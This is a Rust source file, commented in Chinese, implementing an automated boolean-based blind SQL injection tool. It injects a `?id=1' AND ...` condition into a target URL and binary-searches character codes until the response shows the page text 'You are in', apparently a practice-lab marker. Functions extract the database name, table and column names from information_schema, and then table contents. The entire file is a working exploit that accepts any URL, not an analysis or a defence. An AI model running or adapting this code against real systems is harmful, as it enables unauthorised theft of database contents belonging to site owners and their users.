use std::time::Duration;

use reqwest::Client;
use tokio::sync::OnceCell;

static CLIENT: OnceCell<Client> = OnceCell::const_new();

pub async fn init_client() -> Result<&'static Client, Box<dyn std::error::Error>> {
    CLIENT
        .get_or_try_init(|| async {
            Ok(Client::builder()
                .timeout(Duration::from_secs(10))
                .build()
                .unwrap())
        })
        .await
}

pub async fn is_condition_true(url: &str, condition: &str) -> bool {
    let client = init_client().await.unwrap();
    let query = format!("?id=1' AND {}", condition);
    let response = client.get(&format!("{}{}", url, query)).send().await;
    match response {
        Ok(resp) => resp.status().is_success() && resp.text().await.unwrap().contains("You are in"),
        Err(_) => false,
    }
}

pub async fn blind_injection(
    url: &str,
    condition_format: &str,
    limit: u32,
    extra_params: Vec<&str>,
) -> String {
    let mut extracted_value = String::new();
    let mut hold = false; // 控制循环次数
    let mut condition = condition_format.to_string();

    // 格式化
    for param in extra_params {
        condition = condition.replacen("#", param, 1);
    }

    for i in 1..=limit {
        hold = false;
        let mut left: u8 = 31;
        let mut right: u8 = 127;
        let mut mid: u8 = 158 / 2;
        while left < right {
            let mut format_condition = String::new();
            format_condition = condition.replacen("#", i.to_string().as_str(), 1);
            format_condition = format_condition.replacen("#", ">", 1);
            format_condition = format_condition.replacen("#", mid.to_string().as_str(), 1);
            if is_condition_true(url, &format_condition).await {
                left = mid + 1;
            } else {
                right = mid;
            }

            mid = left + (right - left) / 2;
        }

        // mid > 31 时表示找到了. 上面退出循环时, mid 始终是大于 31 (找到) 或者等于 31 (未找到)
        if mid > 31 {
            hold = true;
            let ch = char::from(mid);
            extracted_value.push(ch);
            println!("Found character at position {}: {}", i, &ch);
        }

        // 超出真实字符串长度, 退出循环
        if !hold {
            break;
        }
    }

    extracted_value
}

pub async fn get_database(url: &str) -> String {
    let condition_format = "(SELECT ascii(substr(database(),#,1))) # #--+";
    blind_injection(url, condition_format, 20, vec![]).await
}

pub async fn get_tables(url: &str, database: &str) -> String {
    let condition_format = "(SELECT ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='#'),#,1)) # #)--+";
    blind_injection(url, condition_format, 1024, vec![database]).await
}

pub async fn get_columns(url: &str, database: &str, table: &str) -> String {
    let condition_format = "(SELECT ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='#' AND table_name='#'),#,1)) # #)--+";
    blind_injection(url, condition_format, 1024, vec![database, table]).await
}

pub async fn get_values(url: &str, table: &str, columns: &Vec<String>) -> String {
    let condition_format = format!(
        "(SELECT ascii(substr((SELECT group_concat({}) FROM #),#,1)) # #)--+",
        columns.join(",")
    )
    .replacen(",", ",':',", columns.len() - 1);
    blind_injection(url, condition_format.as_str(), 1024, vec![table]).await
}
